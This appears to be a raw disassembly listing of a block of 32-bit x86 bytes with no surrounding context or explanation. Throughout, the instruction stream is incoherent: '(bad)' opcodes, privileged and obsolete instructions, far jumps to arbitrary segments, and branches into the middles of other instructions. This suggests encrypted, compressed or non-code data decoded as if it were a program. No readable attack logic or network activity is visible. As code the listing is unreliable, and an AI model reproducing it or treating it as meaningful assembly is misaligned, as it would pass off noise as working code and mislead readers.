  402794:	xchg   ecx,eax
  402795:	and    BYTE PTR [edi-0x4a41b3eb],al
  40279b:	hlt    
  40279c:	int3   
  40279d:	dec    esp
  40279f:	mov    eax,0xf0ec2e61
  4027a4:	repnz cmp al,0xfb
  4027a7:	lods   al,BYTE PTR ds:[esi]
  4027a8:	ss (bad) 
  4027aa:	push   ebx
  4027ab:	fyl2x  
  4027ad:	mov    ebx,0x870043fe
  4027b2:	call   DWORD PTR ds:0xb714ef62
  4027b8:	cwde   
  4027b9:	iret   
  4027ba:	mov    eax,ds:0xb356f857
  4027bf:	repz test BYTE PTR [edi-0x74],dl
  4027c3:	(bad)  
  4027c4:	aam    0xd5
  4027c6:	push   esp
  4027c7:	mov    ds:0x9a36eab8,eax
  4027cc:	scas   eax,DWORD PTR es:[edi]
  4027cd:	lea    eax,[edi+eiz*2-0x25a011cb]
  4027d4:	fst    QWORD PTR [ecx]
  4027d6:	inc    BYTE PTR [edi+0x7959bccb]
  4027dc:	dec    edx
  4027dd:	loope  0x40277d
  4027df:	pop    edi
  4027e0:	rcr    al,1
  4027e2:	fwait
  4027e3:	popf   
  4027e4:	outs   dx,BYTE PTR ds:[esi]
  4027e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027e6:	jp     0x40276b
  4027e8:	push   esp
  4027e9:	mov    dl,0x75
  4027eb:	add    al,0x9
  4027ed:	adc    DWORD PTR [edx+0x2d],ebx
  4027f0:	push   0xffffffd8
  4027f2:	fninit 
  4027f4:	mov    ds:0x3571af60,eax
  4027f9:	xor    DWORD PTR [edx+0x207b93c5],esi
  4027ff:	lock add bh,BYTE PTR [ebx]
  402802:	int    0x42
  402804:	js     0x40283d
  402806:	mov    ebx,DWORD PTR [ebx-0x2c7ec1d9]
  40280c:	push   edx
  40280d:	outs   dx,DWORD PTR ds:[esi]
  40280e:	and    BYTE PTR ds:[ebx+0x72],al
  402812:	pushf  
  402813:	aaa    
  402814:	and    eax,0x432388c4
  402819:	cdq    
  40281a:	jecxz  0x4027cc
  40281c:	and    BYTE PTR [esi-0x1f992bc1],dl
  402822:	push   cs
  402823:	jle    0x40282c
  402825:	cmp    DWORD PTR [edi-0x17b25ea0],ebx
  40282b:	xchg   DWORD PTR [ebp-0x6c],ebx
  40282e:	mov    ds:0x6fe14c74,al
  402833:	sub    al,0xf5
  402835:	aad    0x9b
  402837:	aaa    
  402838:	mov    ds,edx
  40283a:	(bad)
  40283d:	aaa    
  40283e:	out    0x7d,al
  402840:	mov    BYTE PTR [ebp+0x551bdd89],0xda
  402847:	mov    cl,0x5
  402849:	push   cs
  40284a:	loop   0x4027e9
  40284c:	in     eax,dx
  40284d:	shl    DWORD PTR [edi-0x5300ab15],1
  402853:	xchg   edi,eax
  402854:	jmp    0x152e:0x76e73b78
  40285b:	dec    edi
  40285c:	push   esp
  40285d:	je     0x402823
  40285f:	jge    0x402827
  402861:	xchg   ebp,eax
  402862:	cmp    edi,DWORD PTR [edx+0x7f]
  402865:	aad    0xad
  402867:	jo     0x4028c4
  402869:	sub    al,0xc0
  40286b:	pop    ebx
  40286c:	jp     0x4028ea
  40286e:	mov    bh,0xe3
  402870:	repz add ch,dl
  402873:	inc    edi
  402874:	add    edx,ebp
  402876:	repnz inc ebx
  402878:	jp     0x402857
  40287a:	nop
  40287b:	loop   0x4028b3
  40287d:	fsub   QWORD PTR [ecx+edx*2+0x5692071f]
  402884:	xor    ebp,DWORD PTR [edi-0x22cab496]
  40288a:	gs aaa 
  40288c:	adc    al,0x77
  40288e:	xchg   ebp,eax
  40288f:	inc    ecx
  402890:	jae    0x402854
  402892:	sub    al,0x8a
  402894:	fs push edx
  402896:	pop    es
  402897:	cmp    bh,ah
  402899:	sub    eax,0xbb815d10
  40289e:	cmp    eax,0x99f8d136
  4028a3:	cdq    
  4028a4:	add    DWORD PTR [edx+0x4149af73],0xd3b828f1
  4028ae:	xor    bh,ch
  4028b0:	xor    DWORD PTR [edi-0x40e40222],edx
  4028b6:	jne    0x4028a6
  4028b8:	call   0x5057e07c
  4028bd:	mov    ebp,0x200c9157
  4028c2:	cwde   
  4028c3:	and    ch,BYTE PTR es:[ebp-0x82c4328]
  4028ca:	arpl   WORD PTR [eax+ebp*1+0x6a9b8498],dx
  4028d1:	mov    esi,DWORD PTR [eax-0x58]
  4028d4:	mov    ecx,0xa037bba4
  4028d9:	push   ebp
  4028da:	or     dh,BYTE PTR [esi-0x3b]
  4028dd:	jl     0x402907
  4028df:	sti    
  4028e0:	jl     0x402929
  4028e2:	sbb    al,0xd6
  4028e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028e5:	pop    edx
  4028e6:	pop    ebx
  4028e7:	xchg   DWORD PTR [ebx+edx*8],esp
  4028ea:	or     BYTE PTR [ebp+0x11a9f26a],dl
  4028f0:	inc    esi
  4028f1:	dec    edi
  4028f2:	pushf  
  4028f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028f4:	ror    DWORD PTR [ecx-0x63],0x14
  4028f8:	ins    DWORD PTR es:[edi],dx
  4028f9:	int    0x3f
  4028fb:	repnz mov esi,0xccdc320f
  402901:	jle    0x4028e7
  402903:	and    BYTE PTR [edx-0x5b],ch
  402906:	mov    DWORD PTR [ecx+0x9],ebx
  402909:	and    eax,0x630e3c78
  40290e:	jmp    0x40297e
  402910:	dec    ebp
  402911:	or     edi,eax
  402913:	shl    bl,0x4e
  402916:	sbb    eax,0xdf6055f5
  40291b:	out    0x3,al
  40291d:	inc    edi
  40291e:	shr    DWORD PTR [ecx+0x160a4092],1
  402924:	jns    0x402953
  402926:	enter  0x290e,0x42
  40292a:	out    dx,eax
  40292b:	xchg   edx,eax
  40292c:	xor    al,0x4c
  40292e:	lods   al,BYTE PTR ds:[esi]
  40292f:	fild   QWORD PTR [ebx-0x1b]
  402932:	pop    esi
  402933:	aad    0x77
  402935:	jnp    0x40298b
  402937:	nop
  402938:	rcl    BYTE PTR [ecx+0x3a],cl
  40293b:	rcl    DWORD PTR [ebx],cl
  40293d:	ret    
  40293e:	pop    ss
  40293f:	cmp    eax,0xc0f195e0
  402944:	and    DWORD PTR [eiz*1-0x6a4d96c9],0x24
  40294c:	ret    0x8e2a
  40294f:	icebp  
  402950:	cdq    
  402951:	sbb    eax,0xb3491678
  402956:	mov    ch,0xe2
  402958:	call   0xfcc9:0xf924dfbe
  40295f:	adc    DWORD PTR [edi+0x2759a230],0x69426062
  402969:	ja     0x402973
  40296b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40296c:	xchg   ebx,eax
  40296d:	jle    0x402924
  40296f:	loopne 0x40291d
  402971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402972:	aam    0xe4
  402974:	inc    eax
  402975:	pop    edi
  402976:	(bad)  
  402978:	stos   BYTE PTR es:[edi],al
  402979:	sti    
  40297a:	clc    
  40297b:	sbb    DWORD PTR [ecx],ecx
  40297d:	loopne 0x40298c
  40297f:	fneni(8087 only) 
  402981:	push   esp
  402982:	jmp    0x40fee835
  402987:	fistp  WORD PTR [edi]
  402989:	loope  0x4029cc
  40298b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40298c:	mov    esp,0x66622815
  402991:	push   edx
  402992:	dec    ebp
  402993:	mov    ah,0x87
  402995:	push   esp
  402996:	jp     0x40297f
  402998:	sub    BYTE PTR [ecx],ah
  40299a:	std    
  40299b:	scas   eax,DWORD PTR es:[edi]
  40299c:	or     BYTE PTR [eax-0x6b],bh
  40299f:	jle    0x40294e
  4029a1:	(bad)  
  4029a2:	lock or eax,0xe18f12d0
  4029a8:	not    DWORD PTR [ecx-0x3978c33]
  4029ae:	mov    WORD PTR [edi+ebx*8+0x593bbcc0],ds
  4029b5:	mov    dl,0x40
  4029b7:	mov    edi,0xebd585c7
  4029bc:	loopne 0x4029c1
  4029be:	push   0x7e
  4029c0:	jb     0x4029ff
  4029c2:	mov    al,0x4e
  4029c4:	mov    esi,0x9a62b5f
  4029c9:	add    eax,0xc381c8b0
  4029ce:	mov    esi,DWORD PTR ds:0xd27b18e2
  4029d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029d5:	jno    0x402a4b
  4029d7:	pop    ebp
  4029d8:	fcomip st,st(1)
  4029da:	das    
  4029db:	aas    
  4029dc:	std    
  4029dd:	adc    eax,0x10a144a1
  4029e2:	out    0x3f,al
  4029e4:	pop    es
  4029e5:	mov    esi,0xd0cb74c4
  4029ea:	jo     0x4029ab
  4029ec:	stos   BYTE PTR es:[edi],al
  4029ed:	imul   esi,esi,0xb7d79d7
  4029f3:	(bad)  
  4029f4:	mov    dl,0x2d
  4029f6:	sbb    DWORD PTR [edi-0x52],0xfe480c46
  4029fd:	jmp    0xecfe:0xa54fa649
  402a04:	pop    edi
  402a05:	add    cl,BYTE PTR [ebp+0x9]
  402a08:	sbb    eax,0xa921e850
  402a0d:	mov    eax,ds:0xc3740e2d
  402a12:	pop    edx
  402a13:	lar    ebp,WORD PTR [esp+ebp*8+0x17]
  402a18:	(bad)  
  402a19:	mov    dh,0xe6
  402a1b:	sbb    dh,al
  402a1d:	xor    eax,0xe52b8f2e
  402a22:	rcl    DWORD PTR [ecx],cl
  402a24:	cmp    ebp,DWORD PTR [ecx+edx*1+0x7c3dd4f8]
  402a2b:	mov    ch,0xdf
  402a2d:	inc    eax
  402a2e:	cmp    dl,BYTE PTR [edx-0x66]
  402a31:	xchg   esp,eax
  402a32:	arpl   WORD PTR [eax],cx
  402a34:	rcl    DWORD PTR [eax+ebx*4+0x14201ed9],1
  402a3b:	inc    ecx
  402a3c:	dec    esp
  402a3d:	lds    ebp,FWORD PTR [ecx-0xa3c083b]
  402a43:	fsubrp st(5),st
  402a45:	std    
  402a46:	inc    edi
  402a47:	test   DWORD PTR [eax+ecx*4],esp
  402a4a:	push   ebp
  402a4b:	cwde   
  402a4c:	rol    edi,0xab
  402a4f:	out    0xfe,eax
  402a51:	jbe    0x402a16
  402a53:	push   ebx
  402a54:	sub    edx,DWORD PTR [ecx+ecx*4]
  402a57:	test   al,0x33
  402a59:	push   cs
  402a5a:	stos   DWORD PTR es:[edi],eax
  402a5b:	inc    edi
  402a5c:	pop    eax
  402a5d:	out    0xbc,eax
  402a5f:	sbb    DWORD PTR [edi+0x29da4b6a],esp
  402a65:	fnstsw ax
  402a67:	inc    esi
  402a68:	or     esi,DWORD PTR ds:[ebx+esi*1]
  402a6c:	push   ebx
  402a6d:	fcom   DWORD PTR [ecx-0x53]
  402a70:	shl    DWORD PTR [edx-0x25],1
  402a73:	in     eax,dx
  402a74:	or     DWORD PTR [edx+0x2c],edi
  402a77:	mov    edx,0x885cb193
  402a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a7d:	xor    ah,BYTE PTR [eax+esi*4]
  402a80:	xor    dl,dl
  402a82:	fisttp DWORD PTR ds:0x6b072478
  402a88:	mov    ebp,0x5d595510
  402a8d:	dec    ebp
  402a8e:	pop    es
  402a8f:	mov    ebx,0x475c8a4b
  402a94:	xor    eax,0x5ad3cc46
  402a99:	or     dh,BYTE PTR [esi]
  402a9b:	xchg   ebp,eax
  402a9c:	cmp    ch,al
  402a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a9f:	pop    esi
  402aa0:	stc    
  402aa1:	out    0xf9,al
  402aa3:	sti    
  402aa4:	std    
  402aa5:	push   edx
  402aa6:	call   0x7cc30b42
  402aab:	mov    bh,0x21
  402aad:	push   eax
  402aae:	out    dx,eax
  402aaf:	enter  0x589f,0x82
  402ab3:	loope  0x402abe
  402ab5:	jns    0x402a90
  402ab7:	popf   
  402ab8:	push   ebx
  402ab9:	jecxz  0x402b1c
  402abb:	mov    al,ds:0x3eca1991
  402ac0:	jecxz  0x402a8f
  402ac2:	dec    edi
  402ac3:	in     eax,dx
  402ac4:	push   edx
  402ac5:	(bad)  
  402ac6:	jg     0x402a4a
  402ac8:	push   edx
  402ac9:	cli    
  402aca:	mov    al,0x81
  402acc:	push   esi
  402acd:	stc    
  402ace:	ss out 0x48,al
  402ad1:	ds cmp al,0xb9
  402ad4:	or     al,0xd9
  402ad6:	adc    ebx,DWORD PTR [edx]
  402ad8:	sbb    BYTE PTR [edi+0x3b],cl
  402adb:	cld    
  402adc:	pop    es
  402add:	pop    es
  402ade:	wbinvd 
  402ae0:	icebp  
  402ae1:	in     eax,dx
  402ae2:	loopne 0x402b52
  402ae4:	pcmpgtd mm1,QWORD PTR ds:[eax-0x7a1fc0c4]
  402aec:	mov    ecx,0x1c22e08
  402af1:	jmp    eax
  402af3:	mov    esp,DWORD PTR [edi+edx*4+0x1d]
  402af7:	jp     0x402b2d
  402af9:	test   bl,dh
  402afb:	ja     0x402b69
  402afd:	jge    0x402ac1
  402aff:	pop    ss
  402b00:	lods   eax,DWORD PTR ds:[esi]
  402b01:	inc    ebx
  402b02:	stos   DWORD PTR es:[edi],eax
  402b03:	stc    
  402b04:	rol    BYTE PTR [eax+0x7c],cl
  402b07:	das    
  402b08:	sbb    ch,BYTE PTR [eax+0x6]
  402b0b:	or     ebx,ebx
  402b0d:	das    
  402b0e:	cmp    DWORD PTR [esi],0x102f5ad1
  402b14:	aas    
  402b15:	xor    eax,0x5d32cafe
  402b1a:	shl    BYTE PTR [eax+0x6fd11f97],0xa2
  402b21:	mov    ecx,DWORD PTR [esi+eiz*2+0x5d]
  402b25:	adc    al,dh
  402b27:	in     al,dx
  402b28:	addr16 pusha 
  402b2a:	jno    0x402b98
  402b2c:	idiv   BYTE PTR cs:[eax+eiz*4]
  402b30:	pop    esp
  402b31:	xchg   esp,eax
  402b32:	push   eax
  402b33:	imul   esp,DWORD PTR [eax+0x6087b593],0xfffffffa
  402b3a:	les    edx,FWORD PTR ds:0x7dbdcd3b
  402b40:	dec    eax
  402b41:	std    
  402b42:	sbb    ah,BYTE PTR [edi+0x70]
  402b45:	(bad)  
  402b46:	mov    WORD PTR [ebx+ebp*4+0x5c],cs
  402b4a:	push   ds
  402b4b:	pop    ss
  402b4c:	aas    
  402b4d:	xchg   edi,eax
  402b4e:	mov    eax,ds:0xd6d58c50
  402b53:	mov    eax,ds:0x6797d30a
  402b58:	ret    0x4cc6
  402b5b:	xlat   BYTE PTR ds:[ebx]
  402b5c:	rep stos DWORD PTR es:[edi],eax
  402b5e:	and    BYTE PTR [esi+0x44],bh
  402b61:	cmp    DWORD PTR [ebp+ebp*2+0x1],ebp
  402b65:	loope  0x402aff
  402b67:	iret   
  402b68:	mov    ebx,DWORD PTR [ebx-0x756039e9]
  402b6e:	adc    al,BYTE PTR [ecx-0x36]
  402b71:	bound  edi,QWORD PTR [edx+0x75e744a0]
  402b77:	(bad)  
  402b78:	sti    
  402b79:	(bad)  
  402b7a:	(bad)  
  402b7b:	fild   DWORD PTR [edi+0x1eca75fa]
  402b81:	inc    esi
  402b82:	int3   
  402b83:	pop    ebx
  402b84:	call   0xe36d:0x6c2a9167
  402b8b:	fimul  WORD PTR [esi]
  402b8d:	mov    esp,0xa1cea8df
  402b92:	hlt    
  402b93:	stos   DWORD PTR es:[edi],eax
  402b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b95:	and    al,0x54
  402b97:	push   cs
  402b98:	sub    al,0x7c
  402b9a:	push   ebp
  402b9b:	pushf  
  402b9c:	or     dl,BYTE PTR [edx-0x2af8a66f]
  402ba2:	repnz nop
  402ba4:	jle    0x402b32
  402ba6:	push   eax
  402ba7:	mov    edi,0x89b74604
  402bac:	retf   0x18eb
  402baf:	popfw  
  402bb1:	and    al,0x68
  402bb3:	add    eax,0xb2d11878
  402bb8:	push   eax
  402bb9:	nop
  402bba:	sbb    al,0x8b
  402bbc:	jnp    0x402c11
  402bbe:	(bad)  
  402bbf:	jae    0x402c28
  402bc1:	cmp    DWORD PTR [ecx+0x1b],eax
  402bc4:	sub    BYTE PTR [edi+0x6c9353d2],ah
  402bca:	jmp    0x1214e160
  402bcf:	retf   0x73f7
  402bd2:	cmc    
  402bd3:	or     ah,BYTE PTR cs:[esp+eax*2]
  402bd7:	sub    eax,ebx
  402bd9:	lea    ebp,[edx+0x22c30b00]
  402bdf:	fild   QWORD PTR ds:[edi-0x6f8793de]
  402be6:	jnp    0x402b9f
  402be8:	add    dh,bh
  402bea:	icebp  
  402beb:	jae    0x402b8a
  402bed:	int3   
  402bee:	ror    DWORD PTR [eax+0x7668b88d],0x6d
  402bf5:	ja     0x402bdb
  402bf7:	lods   eax,DWORD PTR ds:[esi]
  402bf8:	xchg   ebp,eax
  402bf9:	int3   
  402bfa:	(bad)  
  402bfb:	push   eax
  402bfc:	pushf  
  402bfd:	dec    eax
  402bfe:	adc    DWORD PTR [esi+0x45],ebx
  402c01:	lods   al,BYTE PTR ds:[esi]
  402c02:	pop    esi
  402c03:	fdivr  DWORD PTR [edx+0x1945a1a3]
  402c09:	clc    
  402c0a:	hlt    
  402c0b:	inc    edi
  402c0c:	inc    edi
  402c0d:	or     esi,DWORD PTR [esi]
  402c0f:	test   esp,ebx
  402c11:	and    dl,BYTE PTR [ecx-0x17]
  402c14:	add    eax,0xf7214712
  402c19:	fst    st(6)
  402c1b:	or     eax,0x45083bb8
  402c20:	push   ecx
  402c21:	js     0x402c8c
  402c23:	jge    0x402c83
  402c25:	sub    al,0xd2
  402c27:	sub    dh,ch
  402c29:	fadd   DWORD PTR [ecx]
  402c2b:	and    BYTE PTR [esi+0x1324ebdd],0x28
  402c32:	imul   eax,DWORD PTR [eax+0x5cd6ef42],0x7c1bdd4c
  402c3c:	das    
  402c3d:	xchg   ebp,eax
  402c3e:	adc    BYTE PTR [eax+0x50],ah
  402c41:	in     eax,0xb0
  402c43:	dec    eax
  402c44:	adc    BYTE PTR [esi],0xb4
  402c47:	dec    ebp
  402c48:	inc    edx
  402c49:	push   ss
  402c4a:	test   DWORD PTR [edi],0xc4d48703
  402c50:	fcomp  QWORD PTR [edi-0x247916ad]
  402c56:	cmp    dl,BYTE PTR [ebp+0x7d4897]
  402c5c:	pop    ds
  402c5d:	nop
  402c5e:	push   esp
  402c5f:	sub    DWORD PTR [ebx-0x34],esi
  402c62:	push   ds
  402c63:	call   0x2255:0x6b1c5f1d
  402c6a:	adc    DWORD PTR [ecx+0x65be513d],ebx
  402c70:	inc    eax
  402c71:	or     eax,0xde314fee
  402c76:	pop    edi
  402c77:	cmp    BYTE PTR [eax],dl
  402c79:	mov    ebx,0x60ee7a29
  402c7e:	out    0x7a,eax
  402c80:	leave  
  402c81:	push   eax
  402c82:	sbb    eax,DWORD PTR [eax]
  402c84:	mov    BYTE PTR [edi-0x2c2762b9],0xb8
  402c8b:	je     0x402cbd
  402c8d:	shr    DWORD PTR [ebx-0x6ced00e4],cl
  402c93:	xor    BYTE PTR [edi],dh
  402c95:	jmp    0x39ed7ec9
  402c9a:	rcr    ch,1
  402c9c:	call   0xb879:0x29146a8d
  402ca3:	jb     0x402c95
  402ca5:	xchg   DWORD PTR [eax+0x39],ebp
  402ca8:	jmp    0x402d04
  402caa:	rcl    DWORD PTR ds:0xb299f8e5,cl
  402cb0:	scas   eax,DWORD PTR es:[edi]
  402cb1:	sbb    eax,0x1436e9b2
  402cb6:	adc    dh,BYTE PTR [ebp+0x3a]
  402cb9:	and    eax,0x2100b9a7
  402cbe:	mov    dh,0x5f
  402cc0:	idiv   ah
  402cc2:	push   ebx
  402cc3:	adc    dh,BYTE PTR [ecx]
  402cc5:	jbe    0x402d16
  402cc7:	push   ebx
  402cc8:	mov    edx,0x6b018d8b
  402ccd:	retf   
  402cce:	in     eax,dx
  402ccf:	sbb    eax,DWORD PTR [ebp-0x69]
  402cd2:	pop    ebp
  402cd3:	push   0x77
  402cd5:	out    dx,eax
  402cd6:	push   0xff832411
  402cdb:	clc    
  402cdc:	out    0x4e,al
  402cde:	ss repnz iret 
  402ce1:	int    0xb8
  402ce3:	xchg   edx,eax
  402ce4:	nop
  402ce5:	(bad)  
  402ce6:	jecxz  0x402d50
  402ce8:	(bad)  
  402ce9:	cdq    
  402cea:	repnz dec edx
  402cec:	mov    ah,0x16
  402cee:	mov    bh,0x26
  402cf0:	mov    dl,0x96
  402cf2:	lea    edx,[ebp+0x163460dc]
  402cf8:	push   eax
  402cf9:	pop    esi
  402cfa:	loope  0x402ce1
  402cfc:	lds    ecx,FWORD PTR [eax]
  402cfe:	mov    dh,0xad
  402d00:	fsubr  DWORD PTR [ebx]
  402d02:	out    0x4a,al
  402d04:	sbb    BYTE PTR [ecx+eiz*1-0x13782c82],0x7f
  402d0c:	mov    bh,0xf8
  402d0e:	outs   dx,BYTE PTR ds:[esi]
  402d0f:	out    dx,al
  402d10:	and    DWORD PTR ds:[edx-0x76e27436],eax
  402d17:	or     BYTE PTR [ebx-0x4f],0xd3
  402d1b:	ins    BYTE PTR es:[edi],dx
  402d1c:	pop    ds
  402d1d:	dec    edx
  402d1e:	sbb    ecx,ebp
  402d20:	into   
  402d21:	jo     0x402d51
  402d23:	push   ds
  402d24:	inc    eax
  402d25:	stos   BYTE PTR es:[edi],al
  402d26:	and    eax,0x56eb6eba
  402d2b:	test   BYTE PTR [ebp-0x55],0x7
  402d2f:	pminub mm7,QWORD PTR [eax+0x6f]
  402d33:	dec    edi
  402d34:	je     0x402d14
  402d36:	jmp    0x402d3f
  402d38:	jb     0x402d29
  402d3a:	outs   dx,BYTE PTR ds:[esi]
  402d3b:	and    al,0x93
  402d3d:	jle    0x402da1
  402d3f:	loope  0x402d16
  402d41:	xchg   ebx,eax
  402d42:	push   edx
  402d43:	ficom  DWORD PTR ds:[ebp+0x4e3dc9e5]
  402d4a:	or     eax,DWORD PTR [ecx-0x7a3294bf]
  402d50:	aad    0x48
  402d52:	fistp  QWORD PTR [ebp+0x6abc66fd]
  402d58:	in     eax,dx
  402d59:	sub    al,BYTE PTR [edx+0x43]
  402d5c:	add    DWORD PTR [eax-0xedb317d],ebx
  402d62:	aam    0x3a
  402d64:	fld    DWORD PTR [ecx+0x64b36df]
  402d6a:	ja     0x402d3f
  402d6c:	scas   eax,DWORD PTR es:[edi]
  402d6d:	inc    BYTE PTR [edx+0x45]
  402d70:	sbb    DWORD PTR es:[esi-0x1a970bfa],esp
  402d77:	and    BYTE PTR [ecx],dl
  402d79:	cwde   
  402d7a:	inc    ecx
  402d7b:	out    0x8d,eax
  402d7d:	in     eax,dx
  402d7e:	mov    bh,0x33
  402d80:	jmp    0x402d0e
  402d82:	repz mov eax,ds:0xec157051
  402d88:	add    cl,ch
  402d8a:	leave  
  402d8b:	aas    
  402d8c:	(bad)  
  402d8d:	jg     0x402dcc
  402d8f:	fsubp  st(6),st
  402d91:	pop    eax
  402d92:	addr16 test cl,cl
  402d95:	nop
  402d96:	jae    0x402d99
  402d98:	(bad)  
  402d99:	sub    edi,eax
  402d9b:	push   edx
  402d9c:	(bad)  
  402d9d:	jbe    0x402e1c
  402d9f:	call   0x58ed3a2e
  402da4:	or     al,al
  402da6:	dec    DWORD PTR [ebx-0x1c59c459]
  402dac:	and    ebx,DWORD PTR [edi-0x40]
  402daf:	sbb    ch,ch
  402db1:	xor    bh,dl
  402db3:	add    eax,0x8498d2af
  402db8:	leave  
  402db9:	mov    al,0x48
  402dbb:	bound  edi,QWORD PTR [edi]
  402dbd:	mov    bl,0xbf
  402dbf:	aad    0x11
  402dc1:	dec    esi
  402dc2:	sub    esi,DWORD PTR es:[ebx]
  402dc5:	jbe    0x402db1
  402dc7:	std    
  402dc8:	cmp    cl,BYTE PTR [ebx+0x30]
  402dcb:	mov    eax,0x1b50f99c
  402dd0:	mov    al,BYTE PTR [esp]
  402dd3:	inc    edi
  402dd4:	inc    edx
  402dd5:	cmc    
  402dd6:	adc    al,0xa5
  402dd8:	rcl    DWORD PTR [edx],cl
  402dda:	lahf   
  402ddb:	xchg   DWORD PTR [edx+0x57],ebx
  402dde:	mov    bl,bh
  402de0:	fsub   st(3),st
  402de2:	mov    al,ds:0xb79140c2
  402de7:	sub    eax,0x8b856247
  402dec:	jb     0x402e50
  402dee:	fist   DWORD PTR [edi]
  402df0:	adc    al,0xea
  402df2:	adc    BYTE PTR [ecx],dh
  402df4:	pop    ebx
  402df5:	mov    al,ds:0xdee41c8
  402dfa:	(bad)  
  402dfb:	xor    BYTE PTR [esp+esi*2-0x2e087e74],cl
  402e02:	enter  0xa901,0xd3
  402e06:	mov    dh,0x90
  402e08:	push   ss
  402e09:	ins    DWORD PTR es:[edi],dx
  402e0a:	jo     0x402d99
  402e0c:	in     eax,0xad
  402e0e:	add    DWORD PTR [esi],ecx
  402e10:	popa   
  402e11:	sbb    al,0xfa
  402e13:	rep lods eax,DWORD PTR ds:[esi]
  402e15:	or     eax,0x94b7a8b3
  402e1a:	cmp    eax,0x658f0027
  402e1f:	iret   
  402e20:	pusha  
  402e21:	ds das 
  402e23:	push   ecx
  402e24:	jg     0x402dac
  402e26:	inc    ebp
  402e27:	sub    edi,DWORD PTR [edx]
  402e29:	adc    eax,0xe238b13
  402e2e:	cvttps2pi mm1,QWORD PTR [edx+0x798f91ad]
  402e35:	xchg   ebx,eax
  402e36:	or     DWORD PTR [esp+ebp*2],ecx
  402e39:	pushf  
  402e3a:	pop    ebp
  402e3b:	xor    BYTE PTR [ebx-0x7064a136],al
  402e41:	xchg   DWORD PTR ds:0x6930ada,esp
  402e47:	loopne 0x402ebb
  402e49:	sbb    al,0xa0
  402e4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e4c:	mov    BYTE PTR [eax+ebx*4-0x7248787b],al
  402e53:	cmp    ah,dh
  402e55:	sub    eax,0x288075cb
  402e5a:	sbb    cl,BYTE PTR [esi+0x7]
  402e5d:	movd   mm0,ebp
  402e60:	test   al,0x97
  402e62:	mov    esi,0xebc32cdc
  402e67:	ds sahf 
  402e69:	pop    ebx
  402e6a:	pop    ecx
  402e6b:	adc    BYTE PTR [ecx+0x2e],cl
  402e6e:	ins    DWORD PTR es:[edi],dx
  402e6f:	fxch   st(1)
  402e71:	enter  0x3779,0x4d
  402e75:	mov    cl,0xd
  402e77:	pop    ebx
  402e78:	push   0xffffffc5
  402e7a:	ds sub eax,0x8d842f25
  402e80:	xchg   ecx,eax
  402e81:	popf   
  402e82:	mov    bh,BYTE PTR [edx]
  402e84:	nop
  402e85:	test   BYTE PTR [ecx-0x26b325ad],bh
  402e8b:	enter  0x8fb5,0xb1
  402e8f:	mov    bh,0x6c
  402e91:	(bad)  
  402e92:	sti    
  402e93:	and    edi,esp
  402e95:	cmp    al,0x22
  402e97:	mov    bl,0x6f
  402e99:	rcl    al,1
  402e9b:	pop    esp
  402e9c:	nop
  402e9d:	mov    ds:0xeeab0ee0,al
  402ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ea3:	push   esp
  402ea4:	in     al,dx
  402ea5:	popa   
  402ea6:	jmp    0x402eef
  402ea8:	jo     0x402e48
  402eaa:	xchg   edx,eax
  402eab:	inc    esi
  402eac:	(bad)  
  402ead:	or     eax,0xb55b9954
  402eb2:	cmp    eax,0xd002c475
  402eb7:	mov    al,ds:0x15870c13
  402ebc:	ror    DWORD PTR [esi+0x36],0xdd
  402ec0:	mov    WORD PTR ds:0x1573e9d5,ds
  402ec6:	sbb    al,0x57
  402ec8:	ins    BYTE PTR es:[edi],dx
  402ec9:	dec    esp
  402eca:	lods   al,BYTE PTR ds:[esi]
  402ecb:	xor    al,0x3e
  402ecd:	ja     0x402ed9
  402ecf:	dec    edi
  402ed0:	xchg   ebp,esi
  402ed2:	jnp    0x402eae
  402ed4:	outs   dx,DWORD PTR ds:[esi]
  402ed5:	xchg   esp,eax
  402ed6:	or     dl,cl
  402ed8:	je     0x402f21
  402eda:	lahf   
  402edb:	push   ds
  402edc:	imul   DWORD PTR [eax+ecx*8]
  402edf:	retf   
  402ee0:	xlat   BYTE PTR ds:[ebx]
  402ee1:	lods   al,BYTE PTR ds:[esi]
  402ee2:	in     eax,0xde
  402ee4:	sub    eax,edx
  402ee6:	sub    eax,0xacb818b3
  402eeb:	shl    ecx,0x99
  402eee:	(bad)  
  402eef:	xchg   ecx,eax
  402ef0:	jmp    0xad60fb08
  402ef5:	pop    es
  402ef6:	std    
  402ef7:	inc    ebx
  402ef8:	imul   edx,DWORD PTR [ecx-0x6f],0x45e06215
  402eff:	cmp    DWORD PTR [eax-0x528e579b],ebp
  402f05:	jmp    0x402ea5
  402f07:	pop    ds
  402f08:	test   DWORD PTR [edi],0xf5cb7c37
  402f0e:	push   ebx
  402f0f:	sbb    ch,al
  402f11:	les    ebx,FWORD PTR [ebx-0x45]
  402f14:	addr16 or eax,0x70df2018
  402f1a:	fst    QWORD PTR [eax-0x6d32699e]
  402f20:	iret   
  402f21:	inc    eax
  402f22:	(bad)  
  402f23:	or     al,BYTE PTR [eax-0x40c568e2]
  402f29:	cmp    dh,al
  402f2b:	ret    
  402f2c:	mov    dh,0xe5
  402f2e:	add    eax,0xa9eca384
  402f33:	jmp    0x4bff6762
  402f38:	pop    edi
  402f39:	(bad)
  402f3d:	out    0x1c,al
  402f3f:	adc    eax,0x198258ca
  402f44:	into   
  402f45:	mov    dh,0x4b
  402f47:	imul   ebp,DWORD PTR [eax+0x10],0x8
  402f4b:	outs   dx,BYTE PTR ds:[esi]
  402f4c:	pop    ss
  402f4d:	es pop ss
  402f4f:	or     edx,esi
  402f51:	push   0xffffffbb
  402f53:	push   cs
  402f54:	es add al,0xac
  402f57:	mov    ecx,0x1a5d6294
  402f5c:	enter  0xed91,0xd3
  402f60:	fwait
  402f61:	outs   dx,BYTE PTR ds:[esi]
  402f62:	mov    esi,DWORD PTR [ebx-0xa47b2ca]
  402f68:	(bad)  
